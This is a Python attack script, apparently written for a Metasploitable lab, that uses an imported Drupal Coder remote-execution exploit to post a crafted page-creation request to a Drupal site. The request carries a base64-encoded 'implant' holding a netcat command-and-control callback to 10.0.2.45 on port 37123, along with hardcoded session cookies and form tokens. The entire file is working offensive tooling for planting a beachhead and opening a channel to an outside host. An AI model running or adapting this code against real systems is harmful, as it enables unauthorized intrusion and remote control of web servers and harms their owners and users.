from DrupalCoderExec import DrupalCoderExec

import requests
from base64 import b64encode


class BeachheadSender:

    c_and_c = 'nc 10.0.2.45 37123'

    def __init__(self):
        self.exploit = DrupalCoderExec()
        pass

    def set_c_and_c(self, c_and_c: str):
        self.c_and_c = c_and_c

    def create_request(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
        url = "http://" + ip_addr + ":" + port + path
        params = { 'node': 'node/add/page',
                   'render': 'overlay',
                   'render': 'overlay' }
        
        headers = { 'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'Origin': 'http://10.0.2.15',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Referer': 'http://10.0.2.15/drupal/?q=node%2Fadd%2Fpage&render=overlay',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': 'Drupal.toolbar.collapsed=0; has_js=1; SESS3969c8b8b86a6735bbdf41499ed4dd1c=3egn8nOWzcqKC5eYSugFZt4YX9FXZ7m0aI45cswH0SQ',
                    'Connection': 'close'}
        
        implant = b64encode(self.c_and_c.encode('utf-8')).decode('utf-8')

        data =  'title=Upload&body%5Bund%5D%5B0%5D%5Bsummary%5D=&body%5Bund%5D%5B0%5D%5B' 
        data += 'value%5D=' + implant + '&body%5Bund%5D%5B0%5D%5Bformat%5D=filtered_html'
        data += '&changed=&form_build_id=form-Btb_rPnHyH8wIkN0Bxu1chQt1WfW5fb8RwYdJL_oCEw'
        data += '&form_token=10P20EX9YbXxbyg5B6xWVuv-NNavqFkNUKH8SG5Rqus&form_id=page_node_form'
        data += '&menu%5Blink_title%5D=&menu%5Bdescription%5D=&menu%5Bparent%5D=main-menu%3A0'
        data += '&menu%5Bweight%5D=0&log=&path%5Balias%5D=&comment=1&name=metasploitable&date='
        data += '&status=1&additional_settings__active_tab=edit-menu&op=Save'
        
        return requests.post(url=url, headers=headers, params=params, data=data)


if __name__ == "__main__":
    sender = BeachheadSender()
    sender.create_request('10.0.2.15', '80', '/drupal')